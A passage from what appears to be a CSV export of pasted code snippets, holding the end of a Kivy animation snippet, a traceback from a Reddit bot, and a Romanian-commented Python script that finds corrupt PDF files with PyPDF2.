        self.ids.bg.source='images/2b.jpg'
        anim=Animation(opacity=1,duration=1)    
        anim+=Animation(opacity=1,duration=7)
        anim+=Animation(opacity=0,duration=7)       
        anim.start(self.ids.bg)     
        anim.repeat = True"
wjrc8gsP,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Wednesday 8th of May 2024 10:47:59 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
sw8wrjg5,verifica fisiere PDF corupte (care nu se pot deschide),nicuf,Python,Wednesday 8th of May 2024 10:13:55 PM CDT,"import os
from PyPDF2 import PdfReader
from PyPDF2.errors import PdfReadError

# Directorul unde se află fișierele PDF
directory = ""g:/ARHIVA/BCU PDF""

# Lista fișierelor PDF corupte sau care nu se deschid
corrupted_files = []
# Variabilă pentru a ține evidența ultimului fișier parcurs
last_processed_file = None

try:
    # Parcurge fiecare director și subfolder în mod recursiv
    for root, _, files in os.walk(directory):
        for filename in files:
            if filename.endswith("".pdf""):
                # Calea completă a fișierului PDF
                file_path = os.path.join(root, filename)
                # Salvează ultimul fișier parcurs
                last_processed_file = file_path

                # Afișează în timp real fișierul care este parcurs
                print(f""Procesând fișierul: {file_path}"")

                try:
                    # Încearcă să deschizi fișierul PDF
                    reader = PdfReader(file_path)
                    # Verifică dacă documentul are pagini
                    if len(reader.pages) == 0:
                        corrupted_files.append(file_path)
                except (PdfReadError, ValueError, FileNotFoundError):
                    # Dacă apare o eroare la deschiderea fișierului PDF, adaugă-l în lista fișierelor corupte
                    corrupted_files.append(file_path)

except Exception as e:
    # În cazul unei excepții, oprește scriptul și afișează mesajul și informațiile dorite
    print(f""\nScriptul a fost oprit din cauza unei excepții: {e}"")
    print(f""Ultimul fișier parcurs: {last_processed_file}"")

    if corrupted_files:
        print(""Fișierele PDF corupte sau care nu se pot deschide găsite până acum:"")
        for file_path in corrupted_files:
            print(file_path)
    else:
        print(""Nu au fost găsite fișiere corupte sau care nu se pot deschide până acum."")

# Dacă nu a fost oprită de o excepție, afișează fișierele corupte la final
if corrupted_files:
    print(""\nUrmătoarele fișiere PDF sunt corupte sau nu se pot deschide:"")
    for file_path in corrupted_files:
        print(file_path)
else:
    print(""\nToate fișierele PDF din directorul specificat s-au deschis fără probleme."")
"
